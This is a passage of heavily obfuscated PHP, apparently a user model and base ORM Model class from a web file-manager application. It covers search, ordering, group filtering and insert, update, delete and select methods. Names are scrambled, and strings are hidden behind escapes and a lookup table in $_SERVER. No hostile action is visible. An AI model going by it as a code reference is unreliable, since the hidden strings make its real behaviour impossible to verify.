_makeOrder($¢‘µšñ¸ = '') { $âóÃÌ¾ø =& $_SERVER[«òÑğ]; $›‡¦¹¥û = array($âóÃÌ¾ø[1784], $âóÃÌ¾ø[32], $âóÃÌ¾ø[1973], $âóÃÌ¾ø[2195], $âóÃÌ¾ø[1945], $âóÃÌ¾ø[234]); $àş¨ÒÜ = array($âóÃÌ¾ø[526] => $âóÃÌ¾ø[527], $âóÃÌ¾ø[528] => $âóÃÌ¾ø[529]); $éöä³áŠ = Input::get($âóÃÌ¾ø[533], $âóÃÌ¾ø[7], $âóÃÌ¾ø[1775], $›‡¦¹¥û); $°î§£‚» = Input::get($âóÃÌ¾ø[534], $âóÃÌ¾ø[7], $âóÃÌ¾ø[2080], array($âóÃÌ¾ø[2080], $âóÃÌ¾ø[528])); $°î§£‚» = $àş¨ÒÜ[$°î§£‚»]; $¢‘µšñ¸ = $¢‘µšñ¸ . "\x75\x73\x65\x72\x2e{$éöä³áŠ}\x20{$°î§£‚»}\x2c\40\165\163\145\162\56\165\x73\145\x72\111\x44\40\141\x73\x63"; return $this->alias($âóÃÌ¾ø[2211])->order($¢‘µšñ¸); } public function listSearch($ÊÎ¥­Ë§) { $öŞÑÛñ­ =& $_SERVER[«òÑğ]; $†Ú¯—øû = trim($ÊÎ¥­Ë§[$öŞÑÛñ­[2083]]); $“úßŠÀ® = explode($öŞÑÛñ­[53], $†Ú¯—øû); if (!$†Ú¯—øû || count($“úßŠÀ®) == 1) { return $this->listSearchNow($ÊÎ¥­Ë§); } $âÔˆñËø = array($öŞÑÛñ­[448] => array()); foreach ($“úßŠÀ® as $Ìº»ò¼) { if (!trim($Ìº»ò¼)) { continue; } $ÊÎ¥­Ë§[$öŞÑÛñ­[2083]] = $Ìº»ò¼; $ƒŠŒ­£ = $this->listSearchNow($ÊÎ¥­Ë§); $âÔˆñËø[$öŞÑÛñ­[448]] = array_merge($âÔˆñËø[$öŞÑÛñ­[448]], $ƒŠŒ­£[$öŞÑÛñ­[448]]); } $âÔˆñËø[$öŞÑÛñ­[448]] = array_unique_by_key($âÔˆñËø[$öŞÑÛñ­[448]], $öŞÑÛñ­[1784]); $âÔˆñËø[$öŞÑÛñ­[445]] = array($öŞÑÛñ­[446] => count($âÔˆñËø[$öŞÑÛñ­[448]]), $öŞÑÛñ­[442] => 20, $öŞÑÛñ­[431] => 1, $öŞÑÛñ­[447] => 1); return $âÔˆñËø; } public function listSearchNow($››ÛÏá) { $Ã¿ØÔ¤ú =& $_SERVER[«òÑğ]; $é®õŒ­Ğ = trim($››ÛÏá[$Ã¿ØÔ¤ú[2083]]); $µ…ââÔš = isset($››ÛÏá[$Ã¿ØÔ¤ú[2084]]) ? $››ÛÏá[$Ã¿ØÔ¤ú[2084]] : !1; $é®õŒ­Ğ = str_replace($Ã¿ØÔ¤ú[2085], $Ã¿ØÔ¤ú[2086], trim($é®õŒ­Ğ)); $®î·Ô–÷ = array($Ã¿ØÔ¤ú[32] => array($Ã¿ØÔ¤ú[462], "\x25{$é®õŒ­Ğ}\x25"), $Ã¿ØÔ¤ú[383] => array($Ã¿ØÔ¤ú[462], "{$é®õŒ­Ğ}\45"), $Ã¿ØÔ¤ú[2284] => array($Ã¿ØÔ¤ú[462], "{$é®õŒ­Ğ}\45"), $Ã¿ØÔ¤ú[1087] => $Ã¿ØÔ¤ú[2087]); if (Input::check($é®õŒ­Ğ, $Ã¿ØÔ¤ú[389])) { $®î·Ô–÷[$Ã¿ØÔ¤ú[1784]] = array($Ã¿ØÔ¤ú[462], "{$é®õŒ­Ğ}\45"); $®î·Ô–÷[$Ã¿ØÔ¤ú[2503]] = array($Ã¿ØÔ¤ú[462], "{$é®õŒ­Ğ}\45"); } if (!$é®õŒ­Ğ) { $®î·Ô–÷ = array(); } if (isset($››ÛÏá[$Ã¿ØÔ¤ú[834]])) { $®î·Ô–÷[$Ã¿ØÔ¤ú[834]] = $››ÛÏá[$Ã¿ØÔ¤ú[834]]; } $®î·Ô–÷ = $this->parseWhereLike($®î·Ô–÷); $úùĞºÄ = $this->_makeOrder()->where($®î·Ô–÷)->selectPage(20); if (!$úùĞºÄ || count($úùĞºÄ[$Ã¿ØÔ¤ú[448]]) < 5 && Input::check($é®õŒ­Ğ, $Ã¿ØÔ¤ú[396])) { $ğÇ¼ÏÙ = $this->_searchFromMeta($Ã¿ØÔ¤ú[540], $é®õŒ­Ğ, 10); $óêÓ†‡‡ = $this->_searchFromMeta($Ã¿ØÔ¤ú[541], $é®õŒ­Ğ, 10); $ñË¡…™ñ = array_merge($ğÇ¼ÏÙ, $óêÓ†‡‡, $úùĞºÄ[$Ã¿ØÔ¤ú[448]]); $úùĞºÄ[$Ã¿ØÔ¤ú[448]] = array_unique_by_key($ñË¡…™ñ, $Ã¿ØÔ¤ú[1784]); $úùĞºÄ[$Ã¿ØÔ¤ú[445]][$Ã¿ØÔ¤ú[446]] = count($úùĞºÄ[$Ã¿ØÔ¤ú[448]]); $úùĞºÄ[$Ã¿ØÔ¤ú[445]][$Ã¿ØÔ¤ú[447]] = ceil($úùĞºÄ[$Ã¿ØÔ¤ú[445]][$Ã¿ØÔ¤ú[446]] / $úùĞºÄ[$Ã¿ØÔ¤ú[445]][$Ã¿ØÔ¤ú[442]]); } $this->_listDataApply($úùĞºÄ[$Ã¿ØÔ¤ú[448]]); $this->_filterByGroup($úùĞºÄ, $µ…ââÔš); return $úùĞºÄ; } private function _filterByGroup(&$ı¿¡‹‰Û, $š‘·ÁÊü) { $©·ÂÒ€­ =& $_SERVER[«òÑğ]; if (!$š‘·ÁÊü) { return $ı¿¡‹‰Û; } foreach ($ı¿¡‹‰Û[$©·ÂÒ€­[448]] as $•¾ìš¨¤ => &$¡ÃŒßú’) { $ˆóÆíëÄ = array_to_keyvalue($¡ÃŒßú’[$©·ÂÒ€­[2180]], $©·ÂÒ€­[12], $©·ÂÒ€­[1985]); if (!in_array($š‘·ÁÊü, $ˆóÆíëÄ)) { unset($ı¿¡‹‰Û[$©·ÂÒ€­[448]][$•¾ìš¨¤]); } } unset($¡ÃŒßú’); $ı¿¡‹‰Û[$©·ÂÒ€­[448]] = array_values($ı¿¡‹‰Û[$©·ÂÒ€­[448]]); $ı¿¡‹‰Û[$©·ÂÒ€­[445]] = array($©·ÂÒ€­[2248] => count($ı¿¡‹‰Û[$©·ÂÒ€­[448]]), $©·ÂÒ€­[2246] => $ı¿¡‹‰Û[$©·ÂÒ€­[445]][$©·ÂÒ€­[442]], $©·ÂÒ€­[2245] => 1, $©·ÂÒ€­[2247] => 1); } private function _searchFromMeta($Óàùµ†®, $Ò¨¡á¹Â, $µÒƒ±ãÁ) { $ÃÊ¾ã¦ö =& $_SERVER[«òÑğ]; $Ò¨¡á¹Â = strtolower($Ò¨¡á¹Â); $¢Ç¶Ó¿Ú = array($ÃÊ¾ã¦ö[97] => $Óàùµ†®, $ÃÊ¾ã¦ö[453] => array($ÃÊ¾ã¦ö[462], "\x25{$Ò¨¡á¹Â}\45")); $¢Ç¶Ó¿Ú = $this->parseWhereLike($¢Ç¶Ó¿Ú); $‡ı°—Íé = Model($ÃÊ¾ã¦ö[2523])->where($¢Ç¶Ó¿Ú)->limit($µÒƒ±ãÁ)->select(); if (!$‡ı°—Íé) { return array(); } $‡ı°—Íé = array_to_keyvalue($‡ı°—Íé, $ÃÊ¾ã¦ö[12], $ÃÊ¾ã¦ö[1784]); $ÍÙ©ùÜª = $this->where(array($ÃÊ¾ã¦ö[1775] => array($ÃÊ¾ã¦ö[7], $‡ı°—Íé)))->select(); if (!$ÍÙ©ùÜª) { return array(); } return $ÍÙ©ùÜª; } private function _listDataApplyItem($àô‹šÄ) { $˜†ÏÕ¤ç = array($àô‹šÄ); $this->_listDataApply($˜†ÏÕ¤ç); return $˜†ÏÕ¤ç[0]; } private function _listDataApply(&$¡¡Ÿ–ä×) { $æ­àíÎÃ =& $_SERVER[«òÑğ]; if (!$¡¡Ÿ–ä×) { return; } array_remove_key($¡¡Ÿ–ä×, $æ­àíÎÃ[976]); $õ•ÎšºÁ = array_to_keyvalue($¡¡Ÿ–ä×, $æ­àíÎÃ[12], $æ­àíÎÃ[1784]); $this->_listAppendGroup($¡¡Ÿ–ä×, $õ•ÎšºÁ); $this->_listAppendMeta($¡¡Ÿ–ä×, $õ•ÎšºÁ); $this->_listAppendSourceRoot($¡¡Ÿ–ä×, $õ•ÎšºÁ); } private function _listAppendSourceRoot(&$¹¹²œÜÙ, $äÄ£Şğ) { $Â¡Ì¥·ê =& $_SERVER[«òÑğ]; $Ò¢±òÓÈ = Model($Â¡Ì¥·ê[914])->listSourceRoot(SourceModel::TYPE_USER, $äÄ£Şğ); $Ò¢±òÓÈ = array_to_keyvalue($Ò¢±òÓÈ, $Â¡Ì¥·ê[574]); $Ò¢±òÓÈ = array_remove_key($Ò¢±òÓÈ, $Â¡Ì¥·ê[574]); foreach ($¹¹²œÜÙ as &$áè‡ßáá) { $áè‡ßáá[$Â¡Ì¥·ê[90]] = $Ò¢±òÓÈ[$áè‡ßáá[$Â¡Ì¥·ê[1784]]] ? $Ò¢±òÓÈ[$áè‡ßáá[$Â¡Ì¥·ê[1784]]] : array(); } unset($áè‡ßáá); } private function _listAppendGroup(&$·ü™Ÿå², $ÀÖçº¯) { $Ïí¯“Š =& $_SERVER[«òÑğ]; $°şÓùÉÀ = array($Ïí¯“Š[1784] => array($Ïí¯“Š[7], $ÀÖçº¯)); $ÜïÚ”“‰ = Model($Ïí¯“Š[2079])->where($°şÓùÉÀ)->select(); $ÛòÏŸ÷§ = array_to_keyvalue($ÜïÚ”“‰, $Ïí¯“Š[12], $Ïí¯“Š[1985]); $ÛòÏŸ÷§ = array_remove_value(array_unique($ÛòÏŸ÷§), $Ïí¯“Š[231]); if (!$ÛòÏŸ÷§ || !$ÜïÚ”“‰) { return; } $°şÓùÉÀ = array($Ïí¯“Š[1985] => array($Ïí¯“Š[7], $ÛòÏŸ÷§)); $Â«¾¬ä = Model($Ïí¯“Š[2178])->field($Ïí¯“Š[2524])->where($°şÓùÉÀ)->select(); $Â«¾¬ä = array_to_keyvalue($Â«¾¬ä, $Ïí¯“Š[1985]); $ÜïÚ”“‰ = array_to_keyvalue_group($ÜïÚ”“‰, $Ïí¯“Š[1784]); foreach ($ÜïÚ”“‰ as &$´ëĞî´) { $¹™¡ü¸ = array(); foreach ($´ëĞî´ as $¾îşÇá) { if (!$¾îşÇá[$Ïí¯“Š[2093]]) { continue; } $ˆ²¹Ô£¯ = Model($Ïí¯“Š[576])->listData($¾îşÇá[$Ïí¯“Š[2093]]); $¹™¡ü¸[] = array($Ïí¯“Š[1985] => $¾îşÇá[$Ïí¯“Š[1985]], $Ïí¯“Š[2525] => $Â«¾¬ä[$¾îşÇá[$Ïí¯“Š[1985]]][$Ïí¯“Š[32]], $Ïí¯“Š[589] => $Â«¾¬ä[$¾îşÇá[$Ïí¯“Š[1985]]][$Ïí¯“Š[589]], $Ïí¯“Š[490] => $ˆ²¹Ô£¯); } $´ëĞî´ = $¹™¡ü¸; } unset($´ëĞî´); foreach ($·ü™Ÿå² as &$ê¹ÚĞ•ñ) { $ê¹ÚĞ•ñ[$Ïí¯“Š[2180]] = array(); if (isset($ÜïÚ”“‰[$ê¹ÚĞ•ñ[$Ïí¯“Š[1784]]])) { $ê¹ÚĞ•ñ[$Ïí¯“Š[2180]] = $ÜïÚ”“‰[$ê¹ÚĞ•ñ[$Ïí¯“Š[1784]]]; } } unset($ê¹ÚĞ•ñ); } public function userAppendGroup($™Ü„÷î°) { $…Ùø®–ö =& $_SERVER[«òÑğ]; if (!$™Ü„÷î°) { return array(); } $this->_listAppendGroup($™Ü„÷î°, array_to_keyvalue($™Ü„÷î°, $…Ùø®–ö[12], $…Ùø®–ö[1784])); return $™Ü„÷î°; } private function _listAppendMeta(&$À±á®ç°, $©»ÇÓß) { $ù°ˆìƒ =& $_SERVER[«òÑğ]; $‰£áŒÖ = UserJobModel::JOB_KEY; $è³‹¶®¼ = array($ù°ˆìƒ[2504]); $•Ğ•·¶… = array($ù°ˆìƒ[1784] => array($ù°ˆìƒ[7], $©»ÇÓß)); $‰Ùè£ = Model($ù°ˆìƒ[2502])->where($•Ğ•·¶…)->select(); $‰Ùè£ = array_to_keyvalue_group($‰Ùè£, $ù°ˆìƒ[1784]); foreach ($‰Ùè£ as &$ã÷ñ†şõ) { $°Â‹Ì¤† = array(); foreach ($ã÷ñ†şõ as $àïô±€ƒ) { if (!in_array($àïô±€ƒ[$ù°ˆìƒ[97]], $è³‹¶®¼)) { $°Â‹Ì¤†[$àïô±€ƒ[$ù°ˆìƒ[97]]] = $àïô±€ƒ[$ù°ˆìƒ[453]]; } } $ã÷ñ†şõ = $°Â‹Ì¤†; } unset($ã÷ñ†şõ); $Á‹ƒ“Ğ§ = Model($ù°ˆìƒ[2526]); foreach ($À±á®ç° as &$ĞåŠÛ‡©) { $ÛÜêâÜ¥ = array(); if (isset($‰Ùè£[$ĞåŠÛ‡©[$ù°ˆìƒ[1784]]])) { $ÛÜêâÜ¥ = $‰Ùè£[$ĞåŠÛ‡©[$ù°ˆìƒ[1784]]]; } $ĞåŠÛ‡©[$ù°ˆìƒ[2527]] = array(); if (isset($ÛÜêâÜ¥[$‰£áŒÖ])) { $ĞåŠÛ‡©[$ù°ˆìƒ[2527]] = $Á‹ƒ“Ğ§->getUserJobInfo($ÛÜêâÜ¥[$‰£áŒÖ]); } } unset($ĞåŠÛ‡©); } protected function groupUserAll($’¶¶ìç·) { $ü©•´ËÏ =& $_SERVER[«òÑğ]; if (!$’¶¶ìç·) { return !1; } $èŠºÇŠú = Model($ü©•´ËÏ[2079])->field($ü©•´ËÏ[1784])->where(array($ü©•´ËÏ[1985] => array($ü©•´ËÏ[7], $’¶¶ìç·)))->select(); $èŠºÇŠú = array_to_keyvalue($èŠºÇŠú, $ü©•´ËÏ[12], $ü©•´ËÏ[1784]); return array_unique($èŠºÇŠú); } public function userSearch($ÂÃ²ª½, $õ’ğ¡¡„ = "\52") { return Model($_SERVER[«òÑğ][602])->where($ÂÃ²ª½)->field($õ’ğ¡¡„)->find(); } } goto FĞĞì–è“¬; bÍØÏ–‰´ì: define($_SERVER[«òÑğ][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\x6f\162\x64\x65\162", "\141\154\151\x61\x73", "\x68\x61\166\x69\156\147", "\x67\x72\157\x75\160", "\154\x6f\143\153", "\x64\151\x73\x74\151\156\x63\x74", "\x61\x75\x74\157", "\x66\151\154\x74\x65\162", "\166\141\x6c\x69\x64\141\164\x65", "\x72\x65\x73\x75\154\164", "\142\151\x6e\x64", "\164\x6f\153\145\x6e"); public function __construct($…Í¤Í÷Î = '', $ÌÆ±›˜± = '', $Æó€Í = '') { $µ¨ˆ˜²õ =& $_SERVER[«òÑğ]; $this->_initialize(); if (!empty($…Í¤Í÷Î)) { if (strpos($…Í¤Í÷Î, $µ¨ˆ˜²õ[10])) { list($this->dbName, $this->name) = explode($µ¨ˆ˜²õ[10], $…Í¤Í÷Î); } else { $this->name = $…Í¤Í÷Î; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ÌÆ±›˜±)) { $this->tablePrefix = $µ¨ˆ˜²õ[12]; } elseif ($µ¨ˆ˜²õ[12] != $ÌÆ±›˜±) { $this->tablePrefix = $ÌÆ±›˜±; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($µ¨ˆ˜²õ[324]); } $this->db(0, empty($this->connection) ? $Æó€Í : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $À©®´¾ =& $_SERVER[«òÑğ]; if (empty($this->fields)) { if (think_config($À©®´¾[325])) { $ú¤ÎÉˆ× = $this->dbName ? $this->dbName : think_config($À©®´¾[326]); $×†Û–¯Ğ = think_var_cache($À©®´¾[327] . strtolower(get_path_this($ú¤ÎÉˆ×) . $À©®´¾[10] . $this->name)); if ($×†Û–¯Ğ) { $¨”ß”­ú = think_config($À©®´¾[328]); if (empty($¨”ß”­ú) || $×†Û–¯Ğ[$À©®´¾[329]] == $¨”ß”­ú) { $this->fields = $×†Û–¯Ğ; return; } } } $this->flush(); } } public function flush() { $ııêÌªØ =& $_SERVER[«òÑğ]; $this->db->setModel($this->name); $³¥¸ÜìÈ = $this->db->getFields($this->getTableName()); if (!$³¥¸ÜìÈ) { return !1; } $this->fields = array_keys($³¥¸ÜìÈ); $this->fields[$ııêÌªØ[330]] = !1; foreach ($³¥¸ÜìÈ as $šŠÒ¨‡ => $Æ¶â®Ü®) { $·†±‚ìå[$šŠÒ¨‡] = $Æ¶â®Ü®[$ııêÌªØ[33]]; if ($Æ¶â®Ü®[$ııêÌªØ[39]]) { $this->fields[$ııêÌªØ[331]] = $šŠÒ¨‡; if ($Æ¶â®Ü®[$ııêÌªØ[42]]) { $this->fields[$ııêÌªØ[330]] = !0; } } } $this->fields[$ııêÌªØ[332]] = $·†±‚ìå; if (think_config($ııêÌªØ[328])) { $this->fields[$ııêÌªØ[329]] = think_config($ııêÌªØ[328]); } if (think_config($ııêÌªØ[325])) { $Æ¦†´¦¨ = $this->dbName ? $this->dbName : think_config($ııêÌªØ[326]); think_var_cache($ııêÌªØ[327] . strtolower(get_path_this($Æ¦†´¦¨) . $ııêÌªØ[10] . $this->name), $this->fields); } } public function switchModel($Ó˜²ÉÄ, $Æˆß›ë“ = array()) { $ğˆâÍ‘² =& $_SERVER[«òÑğ]; $¸ÊáÊËê = ucwords(strtolower($Ó˜²ÉÄ)) . $ğˆâÍ‘²[333]; if (!class_exists($¸ÊáÊËê)) { think_exception($¸ÊáÊËê . think_lang($ğˆâÍ‘²[334])); } $this->_extModel = new $¸ÊáÊËê($this->name); if (!empty($Æˆß›ë“)) { foreach ($Æˆß›ë“ as $óˆú‹) { $this->_extModel->setProperty($óˆú‹, $this->{$óˆú‹}); } } return $this->_extModel; } public function __set($ÇíøŒş˜, $‹”Ç–¥) { $this->data[$ÇíøŒş˜] = $‹”Ç–¥; } public function __get($‰Ïµ»²) { return isset($this->data[$‰Ïµ»²]) ? $this->data[$‰Ïµ»²] : null; } public function __isset($ÇÂğ·’) { return isset($this->data[$ÇÂğ·’]); } public function __unset($„¹ñ§É¨) { unset($this->data[$„¹ñ§É¨]); } public function __call($£Åî°—¢, $–Ø½æ¶Â) { $ÔÚ¤øİÓ =& $_SERVER[«òÑğ]; if (in_array(strtolower($£Åî°—¢), $this->methods, !0)) { $this->options[strtolower($£Åî°—¢)] = $–Ø½æ¶Â[0]; return $this; } elseif (in_array(strtolower($£Åî°—¢), array($ÔÚ¤øİÓ[335], $ÔÚ¤øİÓ[336], $ÔÚ¤øİÓ[337], $ÔÚ¤øİÓ[338], $ÔÚ¤øİÓ[339]), !0)) { $Â½™ïÆ¶ = isset($–Ø½æ¶Â[0]) ? $–Ø½æ¶Â[0] : $ÔÚ¤øİÓ[223]; $Â½™ïÆ¶ = $this->db->parseKey($Â½™ïÆ¶); return $this->getField(strtoupper($£Åî°—¢) . $ÔÚ¤øİÓ[340] . $Â½™ïÆ¶ . $ÔÚ¤øİÓ[341] . $£Åî°—¢, $ÔÚ¤øİÓ[335]); } elseif (strtolower(substr($£Åî°—¢, 0, 5)) == $ÔÚ¤øİÓ[342]) { $Â½™ïÆ¶ = think_parse_name(substr($£Åî°—¢, 5)); $­´¡Ëá½[$Â½™ïÆ¶] = $–Ø½æ¶Â[0]; return $this->where($­´¡Ëá½)->find(); } elseif (strtolower(substr($£Åî°—¢, 0, 10)) == $ÔÚ¤øİÓ[343]) { $áÏ£Î§Æ = think_parse_name(substr($£Åî°—¢, 10)); $­´¡Ëá½[$áÏ£Î§Æ] = $–Ø½æ¶Â[0]; return $this->where($­´¡Ëá½)->getField($–Ø½æ¶Â[1]); } elseif (isset($this->_scope[$£Åî°—¢])) { return $this->scope($£Åî°—¢, $–Ø½æ¶Â[0]); } elseif (method_exists($this, $£Åî°—¢)) { array_unshift($–Ø½æ¶Â, $£Åî°—¢); return call_user_func_array(array($this, $ÔÚ¤øİÓ[344]), $–Ø½æ¶Â); } else { return call_user_func_array(array(parent, $£Åî°—¢), $–Ø½æ¶Â); } } protected function call() { $ı™ØÎ‚Ù =& $_SERVER[«òÑğ]; $À™Û¿Í = func_get_args(); $»”ıÃÀğ = array_shift($À™Û¿Í); $ÜÆÆ¼› = $»”ıÃÀğ; if (is_array($»”ıÃÀğ)) { $ÜÆÆ¼› = $»”ıÃÀğ[1]; $»”ıÃÀğ = $»”ıÃÀğ[0]; } $¶Äñàßï = count($À™Û¿Í) - 1; if (isset($À™Û¿Í[$¶Äñàßï]) && $À™Û¿Í[$¶Äñàßï] === $»”ıÃÀğ) { think_exception(__CLASS__ . $ı™ØÎ‚Ù[4] . $»”ıÃÀğ . think_lang($ı™ØÎ‚Ù[345])); return; } $À™Û¿Í[] = $»”ıÃÀğ; if (method_exists($this, $ı™ØÎ‚Ù[346])) { $¯şçŞÅÑ = call_user_func_array(array($this, $ı™ØÎ‚Ù[347]), array($ÜÆÆ¼›, $À™Û¿Í)); if (!is_null($¯şçŞÅÑ) && $¯şçŞÅÑ !== !1) { return $¯şçŞÅÑ; } } $–¿ÛŒİş = call_user_func_array(array($this, $»”ıÃÀğ), $À™Û¿Í); if (method_exists($this, $ı™ØÎ‚Ù[348])) { $¯şçŞÅÑ = call_user_func_array(array($this, $ı™ØÎ‚Ù[349]), array($ÜÆÆ¼›, $À™Û¿Í, $–¿ÛŒİş)); if ($¯şçŞÅÑ) { return $¯şçŞÅÑ; } } return $–¿ÛŒİş; } protected function _initialize() { } protected function _facade($‚‚ˆšû) { $˜±°ËÑ =& $_SERVER[«òÑğ]; if (!empty($this->fields)) { foreach ($‚‚ˆšû as $Ò˜¤ìƒ¤ => $ÍÆâãìŒ) { if (is_array($this->fields) && !in_array($Ò˜¤ìƒ¤, $this->fields, !0)) { unset($‚‚ˆšû[$Ò˜¤ìƒ¤]); } elseif (is_scalar($ÍÆâãìŒ)) { $this->_parseType($‚‚ˆšû, $Ò˜¤ìƒ¤); } } } if (!empty($this->options[$˜±°ËÑ[350]])) { $‚‚ˆšû = array_map($this->options[$˜±°ËÑ[350]], $‚‚ˆšû); unset($this->options[$˜±°ËÑ[350]]); } $this->_beforeWrite($‚‚ˆšû); return $‚‚ˆšû; } protected function _beforeWrite(&$ êÂ÷ì) { } public function add($¢÷èãç· = '', $ßßûä’î = array(), $í— ü—ó = false) { if (empty($¢÷èãç·)) { if (!empty($this->data)) { $¢÷èãç· = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[«òÑğ][351]); return !1; } } $ßßûä’î = $this->_parseOptions($ßßûä’î); $¢÷èãç· = $this->_facade($¢÷èãç·); if (!1 === $this->_beforeInsert($¢÷èãç·, $ßßûä’î)) { return !1; } $°ÔÈæ¬ù = $this->db->insert($¢÷èãç·, $ßßûä’î, $í— ü—ó); if (!1 !== $°ÔÈæ¬ù) { $­ÖÃºõÊ = $this->getLastInsID(); if ($­ÖÃºõÊ) { $¢÷èãç·[$this->getPk()] = $­ÖÃºõÊ; $this->_after_insert($¢÷èãç·, $ßßûä’î); return $­ÖÃºõÊ; } $this->_after_insert($¢÷èãç·, $ßßûä’î); } return $°ÔÈæ¬ù; } protected function _beforeInsert(&$‹ÚßÎ–¦, $±¬ÄĞ’á) { } protected function _after_insert($áÙˆáÕİ, $€ÕêØ·Ğ) { } public function addAll($›…‰µãÌ, $éÜ¼¿Òë = array(), $²§»•à = false) { $¼Î›Éöò =& $_SERVER[«òÑğ]; if (empty($›…‰µãÌ)) { $this->error = think_lang($¼Î›Éöò[351]); return !1; } $éÜ¼¿Òë = $this->_parseOptions($éÜ¼¿Òë); foreach ($›…‰µãÌ as $Ğà²íí => $˜ú†åğ¼) { $›…‰µãÌ[$Ğà²íí] = $this->_facade($˜ú†åğ¼); } if (method_exists($this->db, $¼Î›Éöò[352])) { $íª×¨ßì = $this->db->insertAll($›…‰µãÌ, $éÜ¼¿Òë, $²§»•à); } else { $this->startTrans(); foreach ($›…‰µãÌ as $Ğà²íí => $˜ú†åğ¼) { $íª×¨ßì = $this->db->insert($˜ú†åğ¼, $éÜ¼¿Òë, $²§»•à); } $this->commit(); } if (!1 !== $íª×¨ßì) { $Î±“…•œ = $this->getLastInsID(); if ($Î±“…•œ) { return $Î±“…•œ; } } return $íª×¨ßì; } public function selectAdd($Ùğé÷¢û = '', $Àè¯Œ©¹ = '', $îÀ¯´×£ = array()) { $ˆçÜù’â =& $_SERVER[«òÑğ]; $îÀ¯´×£ = $this->_parseOptions($îÀ¯´×£); if (!1 === ($íÂó©Ëœ = $this->db->selectInsert($Ùğé÷¢û ? $Ùğé÷¢û : $îÀ¯´×£[$ˆçÜù’â[353]], $Àè¯Œ©¹ ? $Àè¯Œ©¹ : $this->getTableName(), $îÀ¯´×£))) { $this->error = think_lang($ˆçÜù’â[354]); return !1; } else { return $íÂó©Ëœ; } } public function save($îÎñ…£» = '', $†ıªğ¾ = array()) { $Ãíô¡£ä =& $_SERVER[«òÑğ]; if (empty($îÎñ…£»)) { if (!empty($this->data)) { $îÎñ…£» = $this->data; $this->data = array(); } else { $this->error = think_lang($Ãíô¡£ä[351]); return !1; } } $îÎñ…£» = $this->_facade($îÎñ…£»); $†ıªğ¾ = $this->_parseOptions($†ıªğ¾); $ğ‘åÅÀ¹ = $this->getPk(); if (!isset($†ıªğ¾[$Ãíô¡£ä[355]])) { if (isset($îÎñ…£»[$ğ‘åÅÀ¹])) { $’Ù¿î£ä[$ğ‘åÅÀ¹] = $îÎñ…£»[$ğ‘åÅÀ¹]; $†ıªğ¾[$Ãíô¡£ä[355]] = $’Ù¿î£ä; unset($îÎñ…£»[$ğ‘åÅÀ¹]); } else { $this->error = think_lang($Ãíô¡£ä[354]); return !1; } } if (is_array($†ıªğ¾[$Ãíô¡£ä[355]]) && isset($†ıªğ¾[$Ãíô¡£ä[355]][$ğ‘åÅÀ¹])) { $Öø· Ğë = $†ıªğ¾[$Ãíô¡£ä[355]][$ğ‘åÅÀ¹]; } if (!1 === $this->_beforeUpdate($îÎñ…£», $†ıªğ¾)) { return !1; } $®š”ÏÈ = $this->db->update($îÎñ…£», $†ıªğ¾); if (!1 !== $®š”ÏÈ) { if (isset($Öø· Ğë)) { $îÎñ…£»[$ğ‘åÅÀ¹] = $Öø· Ğë; } $this->_afterUpdate($îÎñ…£», $†ıªğ¾); } return $®š”ÏÈ; } protected function _beforeUpdate(&$ßÉä¹Å‰, $ö¡á—) { } protected function _afterUpdate($·îßÏ›Á, $Ê“›¡Å ) { } public function delete($üÓëôÒ = array()) { $´ÌÈ‚¶ =& $_SERVER[«òÑğ]; if (empty($üÓëôÒ) && empty($this->options[$´ÌÈ‚¶[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $§èŞœçö = $this->getPk(); if (is_numeric($üÓëôÒ) || is_string($üÓëôÒ)) { if (strpos($üÓëôÒ, $´ÌÈ‚¶[50])) { $÷ÛÈñ´Û[$§èŞœçö] = array($´ÌÈ‚¶[356], $üÓëôÒ); } else { $÷ÛÈñ´Û[$§èŞœçö] = $üÓëôÒ; } $this->options[$´ÌÈ‚¶[355]] = $÷ÛÈñ´Û; } $üÓëôÒ = $this->_parseOptions(); if (is_array($üÓëôÒ[$´ÌÈ‚¶[355]]) && isset($üÓëôÒ[$´ÌÈ‚¶[355]][$§èŞœçö])) { $×åÓûÛä = $üÓëôÒ[$´ÌÈ‚¶[355]][$§èŞœçö]; } $ñŸ¬ø‘“ = $this->db->delete($üÓëôÒ); if (!1 !== $ñŸ¬ø‘“) { $±¨¸Ÿ‚• = array(); if (isset($×åÓûÛä)) { $±¨¸Ÿ‚•[$§èŞœçö] = $×åÓûÛä; } $this->_after_delete($±¨¸Ÿ‚•, $üÓëôÒ); } return $ñŸ¬ø‘“; } protected function _after_delete($ÜÄƒ„Ö, $Ú‹¼¹Áô) { } public function select($†Ó«÷¸Ø = array()) { $ö€öœ¾Ì =& $_SERVER[«òÑğ]; if (is_string($†Ó«÷¸Ø) || is_numeric($†Ó«÷¸Ø)) { $„æáİ½€ = $this->getPk(); if (strpos($†Ó«÷¸Ø, $ö€öœ¾Ì[50])) { $‹‘ÅâŒ[$„æáİ½€] = array($ö€öœ¾Ì[356], $†Ó«÷¸Ø); } else { $‹‘ÅâŒ[$„æáİ½€] = $†Ó«÷¸Ø; } $this->options[$ö€öœ¾Ì[355]] = $‹‘ÅâŒ; } elseif (!1 === $†Ó«÷¸Ø) { $†Ó«÷¸Ø = $this->_parseOptions(); return $ö€öœ¾Ì[357] . $this->db->buildSelectSql($†Ó«÷¸Ø) . $ö€öœ¾Ì[358]; } $†Ó«÷¸Ø = $this->_parseOptions(); $å”˜  = $this->db->select($†Ó«÷¸Ø); if (!1 === $å”˜ ) { return !1; } if (empty($å”˜ )) { return null; } $this->_afterSelect($å”˜ , $†Ó«÷¸Ø); return $å”˜ ; } protected function _afterSelect(&$á÷áÉÕ´, $ šòÕĞ) { } public function buildSql($â·øùÂª = array()) { $¦ÓÀ¿¿Ü =& $_SERVER[«òÑğ]; $â·øùÂª = $this->_parseOptions($â·øùÂª); return $¦ÓÀ¿¿Ü[357] . $this->db->buildSelectSql($â·øùÂª) . 